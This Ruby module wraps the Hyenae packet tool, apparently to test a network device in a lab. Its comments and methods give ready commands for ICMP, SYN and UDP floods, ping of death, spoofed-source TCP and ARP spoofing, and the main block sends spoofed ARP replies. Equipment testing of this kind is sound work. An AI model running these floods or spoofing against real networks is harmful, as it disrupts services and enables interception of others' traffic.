#encoding:utf-8
#HyenaeFE must be installed
#this is for packet attack
# '%' means random number for count,seq,offset,ip,mac
#author:wuhongliang
#date:2016-06-03
file_path1 =File.expand_path('../wireshark', __FILE__)
require file_path1
module HtmlTag

		class Packets
				include Wireshark
				attr_accessor :intf, :smac, :sip, :dmac, :dip

				def initialize(smac, sip, dmac, dip, nicname)
						nics = dumpcap_intf_d
						if nics.has_key?(nicname)
								@intf=nics[nicname]["index"]
						else
								fail("Can't find NIC #{nicname}")
						end
						@smac=smac.gsub("-", ":")
						@sip =sip.gsub("-", ".")
						@dmac=dmac.gsub("-", ":")
						@dip =dip.gsub("-", ".")
				end

				#icmp-echo flood
				#rs=`hyenae -I 1 -A 4 -a icmp-echo  -s 00:11:22:33:44:55-192.168.100.10 -d 00:11:22:33:44:55-192.168.100.10 -t 64 -c 1000`
				#ping of death
				# hyenae -I 1 -A 4 -a icmp-echo  -s 00:11:22:33:44:55-192.168.100.10 -d 00:11:22:33:44:05-192.168.100.1 -t 128 -c 10 -p 1472 -e 1000
				def icmp_pkt(count=1000, delay=0, payload=10, ttl=64)
						if payload >=10
								pkt = "icmp-echo -s #{@smac}-#{@sip} -d #{@dmac}-#{@dip} -t #{ttl} -c #{count} -p #{payload}"
								if delay>0
										pkt=pkt+" -e #{delay}"
								end
						else
								pkt = "icmp-echo -s #{@smac}-#{@sip} -d #{@dmac}-#{@dip} -t #{ttl} -c #{count}"
								if delay>0
										pkt=pkt+" -e #{delay}"
								end
						end
						p "Packets:#{pkt}"
						pkt
				end


				#SYN flood
				# hyenae -I 1 -A 4 -a tcp -s  00:11:22:33:44:55-192.168.100.100@2000 -d  00:11:22:33:44:55-192.168.100.1@1245 -f S -t 64 -k 0 -w 8192 -q 0 -Q 1 -c 10000
				#SYN FIN
				# hyenae -I 1 -A 4 -a tcp -s  00:11:22:33:44:55-192.168.100.100@2000 -d  00:11:22:33:44:55-192.168.100.1@5652 -f FS -t 64 -k 0 -w 8192 -q 0 -Q 1 -c 10000
				#FIN no ACK
				# hyenae -I 1 -A 4 -a tcp -s  00:11:22:33:44:55-192.168.100.100@2000 -d  00:11:22:33:44:55-192.168.100.1@5652 -f F -t 64 -k 11 -w 8192 -q 0 -Q 1 -c 10000
				# port random
				#hyenae -I 1 -A 4 -a tcp -s  00:11:22:33:44:55-192.168.100.100@%%%%% -d  00:11:22:33:44:55-192.168.100.1@%%%%% -f S -t 64 -k 11 -w 8192 -q 0 -Q 1 -c 10000
				#LAN attack
				# hyenae -I 1 -A 4 -a tcp -s 00:11:22:33:44:55-192.168.100.1@80 -d 00:11:22:33:44:55-192.168.100.1@80 -f S -t 64 -k 10 -w 8192 -q 1 -Q 1 -c 10000 -u 1000
				#flags,"S","F","R","P","A",
				def tcp_pkt(flags ="S", sport="%%%%%", dport="%%%%%", count=1000, delay=0, payload=10, ttl=64, acknown=0, offset=0, winsize=8192)
						flags=flags.upcase
						if payload >=10
								pkt= "tcp -s #{@smac}-#{@sip}@#{sport} -d #{@dmac}-#{@dip}@#{dport} -f #{flags} -t #{ttl} -k #{acknown} -w #{winsize} -q #{offset} -Q 1 -c #{count} -p #{payload}"
								if delay>0
										pkt=pkt+" -e #{delay}"
								end
						else
								pkt= "tcp -s #{@smac}-#{@sip}@#{sport} -d #{@dmac}-#{@dip}@#{dport} -f #{flags} -t #{ttl} -k #{acknown} -w #{winsize} -q #{offset} -Q 1 -c #{count}"
								if delay>0
										pkt=pkt+" -e #{delay}"
								end
						end
						p "Packets:#{pkt}"
						pkt
				end

				#UDP flood
				# hyenae -I 1 -A 4 -a udp -s 00:11:22:33:44:55-192.168.100.100@61020 -d 00:11:22:33:44:55-192.168.100.1@52301 -t 64 -c 10000
				#UDP random
				# hyenae -I 1 -A 4 -a udp -s 00:11:22:33:44:55-192.168.100.10@63210 -d 00:11:22:33:44:55-192.168.100.10@51000 -t 64 -c 10000
				def udp_pkt(sport="%%%%%", dport="%%%%%", count=1000, delay=0, payload=10)
						if payload >=10
								pkt= "udp -s #{@smac}-#{@sip}@#{sport} -d #{@dmac}-#{@dip}@#{dport} -c #{count} -p #{payload}"
								if delay>0
										pkt=pkt+" -e #{delay}"
								end
						else
								pkt= "udp -s #{@smac}-#{@sip}@#{sport} -d #{@dmac}-#{@dip}@#{dport} -c #{count}"
								if delay>0
										pkt=pkt+" -e #{delay}"
								end
						end
						p pkt
						pkt
				end

				#ARP arp-request
				#hyenae -I 2 -A 4 -a arp-request -s 00:11:22:33:00:11 -d FF:FF:FF:FF:FF:FF -S 00:11:22:33:%%:%%-192.168.100.%%% -D 00:00:00:00:00:00-192.168.100.1 -c 100 -e 10
				#ARP-cheat arp-reply
				# hyenae -I 2 -A 4 -a arp-reply -s 00:11:22:33:00:01 -d 00:11:22:A0:00:01 -S 00:11:22:33:%%:%%-192.168.100.%%% -D 00:11:22:A0:00:01-192.168.100.1 -c 100 -e 1000
				# delay 发包延迟单位ms，通过设置延迟大小控制每秒发包数
				def arp_pkt(type, count=1000, delay=0, smac=@smac, sip=@sip, dmac=@dmac, dip=@dip)
						if type=="arp-request"
								pkt= "#{type} -s #{@smac} -d FF:FF:FF:FF:FF:FF -S #{smac}-#{sip} -D 00:00:00:00:00:00-#{dip} -c #{count}"
								if delay>0
										pkt=pkt+" -e #{delay}"
								end
						elsif type=="arp-reply"
								pkt= "#{type} -s #{@smac} -d #{@dmac} -S #{smac}-#{sip} -D #{dmac}-#{dip} -c #{count}"
								if delay>0
										pkt=pkt+" -e #{delay}"
								end
						else
								fail "arp type error:#{type}"
						end
						p "Packets:#{pkt}"
						pkt
				end

				def send_pkt(pkt)
						hyenae_cmd = "hyenae -I #{@intf} -A 4 -a #{pkt}"
						p hyenae_cmd
						result={}
						begin
								rs = `#{hyenae_cmd}`
								print rs
								# Finished: 1000 packets sent (420000 bytes) in 7.722 seconds
								/Finished:\s+(?<pktnum>\d+)\s+packets.+\((?<pktsize>\d+)\s+bytes.+in\s+(?<time>\d+\.\d+)\s+seconds/im=~rs
								result={pktnum: pktnum, pktsize: pktsize, elapse: time}
						rescue => ex
								print ex.message.to_s
								false
						end
				end

				def send_icmp(count=1000, delay=0, payload=10, ttl=64)
						pkt = icmp_pkt(count, delay, payload, ttl)
						send_pkt(pkt)
				end

				def send_tcp(flags ="S", sport="%%%%%", dport="%%%%%", count=1000, delay=0, payload=10, ttl=64, acknown=0, offset=0, winsize=8192)
						pkt = tcp_pkt(flags, sport, dport, count, delay, payload, ttl, acknown, offset, winsize)
						send_pkt(pkt)
				end

				def send_udp(sport="%%%%%", dport="%%%%%", count=1000, delay=0, payload=10)
						pkt = udp_pkt(sport, dport, count, delay, payload)
						send_pkt(pkt)
				end

				def send_arp(type, count=1000, delay=0, smac=@smac, sip=@sip, dmac=@dmac, dip=@dip)
						pkt = arp_pkt(type, count, delay, smac, sip, dmac, dip)
						send_pkt(pkt)
				end

		end
end

if __FILE__==$0
		p smac = "00-E0-4D-68-04-06".gsub!("-", ":")
		p sip = "192.168.100.10"

		p dmac = "02-11-22-37-12-22".gsub!("-", ":")
		p dip = "192.168.100.1"
		pkt_obj= HtmlTag::Packets.new(smac, sip, dmac, dip, "dut")
		p smac = smac.gsub("-", ":").sub(/:\w+:\w+$/, ":%%:%%")
		# @pc_ip  = nicinfo[@ts_nicname][:ip][0]
		p sip = sip.sub(/.\d+$/, ".%%%")
		pkt_obj= HtmlTag::Packets.new(smac, sip, dmac, dip, "dut")
		rs     = pkt_obj.send_arp("arp-reply", 1000, 50, smac, sip)


		# print pkt = pkt_obj.send_icmp(100)
		flag   ="S"
		sport  ="%%%%"
		dport  ="2584"
		# print pkt = pkt_obj.send_tcp(flag, sport, dport, 100)
		# print `hyenae -I 2 -A 4 -a icmp-echo  -s 00:E0:4D:68:04:06-192.168.100.10 -d 02:11:22:37:12:22-192.168.100.1 -t 64 -c 1000`
		# print `hyenae -I 2 -A 4 -a icmp-echo  -s 00:E0:4D:68:04:06-192.168.100.10 -d 02:11:22:37:12:22-192.168.100.1 -t 64 -c 1000`
end